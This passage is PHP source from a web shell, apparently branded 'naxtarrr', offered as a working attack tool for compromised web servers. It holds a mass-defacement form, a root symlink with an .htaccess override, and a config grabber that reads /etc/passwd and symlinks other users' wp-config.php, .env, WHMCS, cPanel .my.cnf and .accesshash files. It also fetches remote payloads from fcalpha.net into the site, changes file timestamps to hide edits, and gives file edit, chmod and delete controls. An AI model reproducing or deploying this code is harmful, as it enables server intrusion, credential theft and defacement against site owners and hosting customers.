                                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5h12m0 0L9 1m4 4L9 9" />
                                </svg>
                            </label>
                        </li>
                        <li>
                            <input type="radio" id="mass-def-2" name="mass_type" value="mahal" class="hidden peer">
                            <label for="mass-def-2" class="inline-flex items-center justify-between w-full p-5 text-gray-500 bg-white border border-gray-200 rounded-lg cursor-pointer dark:hover:text-gray-300 dark:border-gray-700 dark:peer-checked:text-blue-500 peer-checked:border-blue-600 dark:peer-checked:border-blue-600 peer-checked:text-blue-600 hover:text-gray-600 hover:bg-gray-100 dark:text-gray-400 dark:bg-gray-800 dark:hover:bg-gray-700">
                                <div class="block">
                                    <div class="w-full text-lg font-semibold">MASS</div>
                                    <div class="w-full">Mass upload to all folders exists</div>
                                </div>
                                <svg class="w-5 h-5 ms-3 rtl:rotate-180" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 10">
                                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5h12m0 0L9 1m4 4L9 9" />
                                </svg>
                            </label>
                        </li>
                    </ul>

                    <div class="mb-4">
                        <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">File Name:</label>
                        <input type="text" id="file_name" name="file_name" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="index.html" required>
                    </div>

                    <div class="mb-4">
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">File Content:</label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="<h1>Hacked by ...</h1>" required></textarea>
                    </div>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="massdeface">
                        Execute
                    </button>
                </form>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "b64decode") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="b64decode" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">Base64 Encoded:</label>
                    <textarea id="b64decode" name="b64decode" rows="12" class="block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required><?php echo (isset($_POST["b64decode"])) ? htmlspecialchars($_POST["b64decode"]) : ""; ?></textarea>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="decode">
                        Decode
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["decode"])) {
                $b64decode = $_POST["b64decode"];
                if (empty($b64decode)) {
                    echo "<font color='red'>Input is empty</font>";
                } else {
                    $decoded = base64_decode($b64decode);
                    if ($decoded === false) {
                        echo "<font color='red'>Invalid Base64 string</font>";
                    } else {
            ?>
                        <div class='mt-4 mb-3 text-gray-700 dark:text-gray-300'>
                            <strong>Decoded Output:</strong>
                            <textarea id="copyTarget" rows='12' class='block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500' readonly><?= htmlspecialchars($decoded); ?></textarea>
                            <button id="copyBtn" class="block mt-3 mx-auto text-blue-700 hover:text-white border border-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:border-blue-500 dark:text-blue-500 dark:hover:text-white dark:hover:bg-blue-500 dark:focus:ring-blue-800 cursor-pointer" onclick="copyToClipboard()">Copy to Clipboard</button>
                        </div>
            <?php
                    }
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "b64encode") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="b64dencode" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">Strings To Encode:</label>
                    <textarea id="b64dencode" name="b64dencode" rows="12" class="block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required><?php echo (isset($_POST["b64dencode"])) ? htmlspecialchars($_POST["b64dencode"]) : ""; ?></textarea>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="decode">
                        Encode
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["decode"])) {
                $b64dencode = $_POST["b64dencode"];
                if (empty($b64dencode)) {
                    echo "<font color='red'>Input is empty</font>";
                } else {
                    $decoded = base64_encode($b64dencode);
                    if ($decoded === false) {
                        echo "<font color='red'>Invalid Base64 string</font>";
                    } else {
            ?>
                        <div class='mt-4 mb-3 text-gray-700 dark:text-gray-300'>
                            <strong>Encoded Output:</strong>
                            <textarea id="copyTarget" rows='12' class='block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500' readonly><?= htmlspecialchars($decoded); ?></textarea>
                            <button id="copyBtn" class="block mt-3 mx-auto text-blue-700 hover:text-white border border-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:border-blue-500 dark:text-blue-500 dark:hover:text-white dark:hover:bg-blue-500 dark:focus:ring-blue-800 cursor-pointer" onclick="copyToClipboard()">Copy to Clipboard</button>
                        </div>
            <?php
                    }
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "symvhosts") {
            ?>
            <form action="" method="post">
                <div class='mt-4'>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="createsymvhost">
                        Start Symlink Vhosts
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["createsymvhost"])) {
                system('ln -s / naxtarrr_vhosts.txt');
                $b64htacs = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
                $write = error_log(base64_decode($b64htacs), 3, $path . "/.htaccess");
                $naxtarrr_vhosts = symlink("/", "naxtarrr_vhosts.txt");
            ?>
                <div class='mt-4 mb-3 text-center text-gray-700 dark:text-gray-300'>
                    <strong>Symlink Created:</strong>
                    <a href="naxtarrr_vhosts.txt" target="_blank" class="text-blue-600 hover:underline">naxtarrr_vhosts.txt</a>
                </div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "sym403") {
            ?>
            <form action="" method="post">
                <div class='mt-4'>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="createsym403">
                        Spawn Symlink 403
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["createsym403"])) {
                error_log(requests("https://fcalpha.net/web/photo/20151024/bypass/e-sym403.txt"), 3, $path . "/sym403.php");
                $admloc = $path . "/sym403.php";
                $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web . "", $admloc);

                $_SESSION["success"] = "Symlink 403 Spawned Successfully!";
                $_SESSION["goto"] = [
                    "text" => "OPEN SYM403",
                    "location" => $result
                ];

                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "grabconfig") {
            ini_set('max_execution_time', 0);
            @ini_set('display_errors', 0);
            @ini_set('file_uploads', 1);
            ?>
            <form class="mt-4" method="post" action="">
                <label for="passwd" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">List of users:</label>
                <textarea name="passwd" rows="15" class="block p-2.5 w-full mb-3 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="one user per line" required><?php $uSr = file("/etc/passwd");
                                                                                                                                                                                                                                                                                                                                                                                                    foreach ($uSr as $usrr) {
                                                                                                                                                                                                                                                                                                                                                                                                        $str = explode(":", $usrr);
                                                                                                                                                                                                                                                                                                                                                                                                        echo $str[0] . "\n";
                                                                                                                                                                                                                                                                                                                                                                                                    } ?></textarea>
                <input type="hidden" class="input" name="folfig" value="naxtarrr_config" />
                <label for="grabtype" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Select type</label>
                <select id="grabtype" name="grabtype" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                    <option title="type txt" value=".txt" selected>.txt</option>
                    <option title="type php" value=".php">.php</option>
                    <option title="type shtml" value=".shtml">.shtml</option>
                    <option title="type ini" value=".ini">.ini</option>
                    <option title="type html" value=".html">.html</option>
                </select>
                <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="conf">
                    Execute
                </button>
            </form>
        <?php
        }
        if (isset($_POST['conf'])) {
            $v = "var";
            $folfig = $_POST['folfig'];
            $type = $_POST['grabtype'];
            @mkdir($folfig, 0755);
            @chdir($folfig);
            $confhtacs = "T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCAubXkuY25mDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRUeXBlIHR4dCAubXkuY25mDQpBZGRUeXBlIHR4dCAuYWNjZXNzaGFzaA0KQWRkSGFuZGxlciB0eHQgLnBocA0KQWRkSGFuZGxlciB0eHQgLmNuZg0KQWRkSGFuZGxlciB0eHQgLmFjY2Vzc2hhc2g=";
            error_log(base64_decode($confhtacs), 3, $path . "/" . $folfig . "/.htaccess");
            $passwd = explode("\n", $_POST["passwd"]);
            foreach ($passwd as $pwd) {
                $user = trim($pwd);
                symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
                symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
                symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
                symlink('/home/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
                symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-Wp1.txt');
                symlink('/home/' . $user . '/htdocs/wp-config.php', $user . '-Wp-htdocs.txt');
                symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-Wp2.txt');
                symlink('/home/' . $user . '/public_html/web/wp-config.php', $user . '-Wp3.txt');
                symlink('/home1/' . $user . '/public_html/wp-config.php', $user . '-WpHm1.txt');
                symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-WpHm2.txt');
                symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-WpHm3.txt');
                symlink('/var/www/html/wp-config.php', $v . '-wp1.txt');
                symlink('/home/' . $user . '/public_html/.env', $user . '-Laravel1.txt');
                symlink('/home/' . $user . '/public_html/web/.env', $user . '-Laravel2.txt');
                symlink('/home/' . $user . '/public_html/public/.env', $user . '-Laravel3.txt');
                symlink('/var/www/html/.env', $v . '-LaravelV.txt');
                symlink('/home/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
                symlink('/home/' . $user . '/public_html/html/configuration.php', $user . '-Joomla2.txt');
                symlink('/home/' . $user . '/public_html/web/configuration.php', $user . '-Joomla3.txt');
                symlink('/home/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
                symlink('/home/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
                symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
                symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
                symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
                symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
                symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
                symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
                symlink('/home/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
                symlink('/home/' . $user . '/public_html/app/etc/local.xml', $user . '-Magento.txt');
                symlink('/home/' . $user . '/public_html/configuration.php', $user . '-Joomla.txt');
                symlink('/home/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter.txt');
                symlink('/home/' . $user . '/public_html/web/application/config/database.php', $user . '-CodeIgniterH.txt');
                symlink('/home1/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter1.txt');
                symlink('/home2/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter2.txt');
                symlink('/home3/' . $user . '/public_html/application/config/database.php', $user . '-CodeIgniter3.txt');
                symlink('/home/' . $user . '/.my.cnf', $user . '-cpanel.txt');
                symlink('/home/' . $user . '/.accesshash', $user . '-whm.txt');
                symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-opencart.txt');
                symlink('/home/' . $user . '/public_html/app/etc/local.xml', $user . '-mangento.txt');
            }
        ?>
            <div class='mt-4 mb-3 text-center text-gray-700 dark:text-gray-300'>
                <strong>Check Here:</strong>
                <a href="<?= $folfig; ?>" target="_blank" class="text-blue-600 hover:underline"><?= $folfig; ?></a>
            </div>
        <?php
        }

        if (isset($_GET["action"]) && $_GET["action"] === "changedate") {
            $itemPath = $path . "/" . $_GET["item"];
        ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="new_date" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">Edit Date</label>
                    <input type="text" id="new_date" name="new_date" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= filedate($itemPath); ?>" required>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="changedate">
                        Change Date
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["changedate"])) {
                $new_date = $_POST["new_date"];
                if (chdate($itemPath, $new_date)) {
                    $_SESSION["success"] = "Date changed successfully!";
                    header("Refresh:0; url=?path=" . $path . "&item=" . $_GET["item"] . "&action=changedate" . $toPage);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to change date!";
                    header("Refresh:0; url=?path=" . $path . "&item=" . $_GET["item"] . "&action=changedate" . $toPage);
                    exit;
                }
                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "adminer") {
            ?>
            <form action="" method="post">
                <div class='mt-4'>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="createadminer">
                        Spawn Adminer
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["createadminer"])) {
                error_log(requests("https://fcalpha.net/web/photo/20151024/bypass/e-adm.txt"), 3, $path . "/adm.php");
                $admloc = $path . "/adm.php";
                $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web . "", $admloc);

                $_SESSION["success"] = "Adminer Spawned Successfully!";
                $_SESSION["goto"] = [
                    "text" => "OPEN ADMINER",
                    "location" => $result
                ];

                header("Refresh:0; url=?path=" . $path . $toPage);
                exit;
            }
        }
        /* END TOOLS */

        /* FILE ACTIONS */
        if (isset($_GET["path"]) && @$_GET["action"] === "newfile") {
            ?>
            <form id="handle_file" method="post" action="">
                <div class='mt-4'>
                    <div class="mb-4">
                        <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">New File Name:</label>
                        <input type="text" id="file_name" name="file_name" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    </div>

                    <div class="mb-4">
                        <label for="new_file_content" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">File Content:</label>
                        <textarea id="new_file_content" name="new_file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"></textarea>
                    </div>

                    <div class="mb-4">
                        <label for="new_file_method" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">Select edit method</label>
                        <select id="new_file_method" name="new_file_method" onchange="showInfo()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                            <option value="basic">Using basic write file</option>
                            <option value="cmd">Using command</option>
                        </select>
                    </div>
                    <div class="hidden mb-4" id="infoMethod">
                        <div class="flex items-center p-4 mb-4 text-sm text-blue-800 rounded-lg bg-blue-50 dark:bg-gray-800 dark:text-blue-400" role="alert">
                            <svg class="shrink-0 inline w-4 h-4 me-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M10 .5a9.5 9.5 0 1 0 9.5 9.5A9.51 9.51 0 0 0 10 .5ZM9.5 4a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3ZM12 15H8a1 1 0 0 1 0-2h1v-3H8a1 1 0 0 1 0-2h2a1 1 0 0 1 1 1v4h1a1 1 0 0 1 0 2Z" />
                            </svg>
                            <span class="sr-only">Info</span>
                            <div>
                                <span class="font-medium">Info!</span> If the strings too long, it will be failed to create file (command method only).
                            </div>
                        </div>
                    </div>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfile">
                        Create file
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["newfile"])) {
                $filename = $_POST["file_name"];
                $content = $_POST["new_file_content"];
                $method  = $_POST["new_file_method"];

                if (file_editor($path, $filename, base64_decode($content), $method)) {
                    $_SESSION["success"] = "File created successfully!";
                    $_SESSION["goto"] = [
                        "text" => "EDIT FILE",
                        "location" => "?path=$path&file=" . str_replace(".temporary", "", $filename) . "&action=edit&search=$search"
                    ];
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to create file!";
                    header("Refresh:0; url=?path=" . $path . $toPage);
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "view" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
                // Capture file output
                ob_start();
                readfile($filePath);
                $fileContent = ob_get_clean();
            ?>
                <div class="mt-4 text-gray-700 dark:text-gray-300">
                    <h2 class="text-lg font-semibold">
                        File Content: <code><?= htmlspecialchars($_GET["file"]); ?></code>
                    </h2>
                    <?php
                    $fileExt = pathinfo($filePath, PATHINFO_EXTENSION);
                    $imageExtensions = ["jpg", "jpeg", "png", "gif", "bmp", "webp", "svg", "ico"];
                    if (in_array(strtolower($fileExt), $imageExtensions)) {
                        $mimeType = mime_content_type($filePath);
                        $base64   = base64_encode(file_get_contents($filePath));
                    ?>
                        <div class="flex items-center content-center p-5 w-full h-auto max-h-[300px] text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none">
                            <img src="data:<?= $mimeType; ?>;base64,<?= $base64; ?>" alt="Image" class="w-full max-w-[350px] h-auto max-h-[270px] rounded-lg shadow-md mx-auto">
                        </div>
                    <?php
                    } else {
                    ?>
                        <textarea rows="12" class="block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none" readonly><?= htmlspecialchars($fileContent); ?></textarea>
                    <?php
                    }
                    ?>
                </div>
                <div class="flex gap-x-2 mt-2">
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $path; ?>&file=<?= $file; ?>&action=edit<?= $toPage ?>">Edit</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $path; ?>&file=<?= $file; ?>&action=renamefile<?= $toPage ?>">Rename</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $path; ?>&file=<?= $file; ?>&action=chmodfile<?= $toPage ?>">Chmod</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $path; ?>&file=<?= $file; ?>&action=deletefile<?= $toPage ?>">Delete</a>
                </div>
            <?php
            } else {
            ?>
                <div class='mt-4 text-red-600 font-medium font-medium'>File does not exist or is not readable.</div>
            <?php
            }
        }


        if (isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
                ob_start();
                readfile($filePath);
                $fileContent = ob_get_clean();
            ?>
                <form id="handle_file" method="post" action="">
                    <div class='mt-4'>
                        <div class="mb-4">
                            <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 font-medium dark:text-white">File Name:</label>
                            <input type="text" id="file_name" name="file_name" value="<?= $file; ?>" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                        </div>

                        <div class="mb-4">
                            <textarea name="edit_file_content" rows="12" class='block p-2.5 w-full text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none'><?= htmlspecialchars($fileContent); ?></textarea>
                        </div>

                        <div class="mb-4">
                            <label for="edit_file_method" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">Select edit method</label>
                            <select id="edit_file_method" name="edit_file_method" onchange="showInfo()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                                <option value="basic">Using basic write file</option>
                                <option value="cmd">Using command</option>
                            </select>
                        </div>

                        <div class="hidden mb-4" id="infoMethod">
                            <div class="flex items-center p-4 mb-4 text-sm text-blue-800 rounded-lg bg-blue-50 dark:bg-gray-800 dark:text-blue-400" role="alert">
                                <svg class="shrink-0 inline w-4 h-4 me-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 20">
                                    <path d="M10 .5a9.5 9.5 0 1 0 9.5 9.5A9.51 9.51 0 0 0 10 .5ZM9.5 4a1.5 1.5 0 1 1 0 3 1.5 1.5 0 0 1 0-3ZM12 15H8a1 1 0 0 1 0-2h1v-3H8a1 1 0 0 1 0-2h2a1 1 0 0 1 1 1v4h1a1 1 0 0 1 0 2Z" />
                                </svg>
                                <span class="sr-only">Info</span>
                                <div>
                                    <span class="font-medium">Info!</span> If the strings too long, it will be failed to edit file (command method only).
                                </div>
                            </div>
                        </div>

                        <button class="block w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="editfile">
                            Save Changes
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["editfile"])) {
                    $filename = $_POST['file_name'];
                    $content = $_POST["edit_file_content"];
                    $method  = $_POST["edit_file_method"];

                    if (file_editor($path, $filename, base64_decode($content), $method)) {
                        $_SESSION["success"] = "File updated successfully!";
                        if ($filename == $file) {
                            header("Refresh:0; url=?path=" . $path . "&file=" . str_replace(".temporary", "", $file) . "&action=edit" . $toPage);
                        } else {
                            header("Refresh:0; url=?path=" . $path . "&file=" . str_replace(".temporary", "", $filename) . "&action=edit" . $toPage);
                        }
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to update file!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600 font-medium'>File does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"])) {
            $filePath = $path . "/" . $file;
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Chmod File: <code><?= htmlspecialchars($file); ?></code></h2>
                        <input type="text" name="new_perms" class="block w-full p-2.5 text-sm text-gray-900 font-medium bg-gray-50 shadow-md rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= substr(sprintf('%o', @fileperms($filePath)), -4); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-indigo-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-indigo-600 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="chmodfile">
                            Change Permission
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfile"])) {
                    $newPerms = intval($_POST["new_perms"], 8);

                    if (chmod($filePath, $newPerms)) {
                        $_SESSION["success"] = "Successfully changed permission!";
                        header("Refresh:0; url=?path=" . $path . "&file=" . $file . "&action=chmodfile" . $toPage);
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to changed permission!";
                        header("Refresh:0; url=?path=" . $path . $toPage);
                        exit;
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600 font-medium'>File does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefile" && isset($_GET["file"])) {
            $filePath = $path . "/" . $file;
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
                if (unlink($filePath)) {
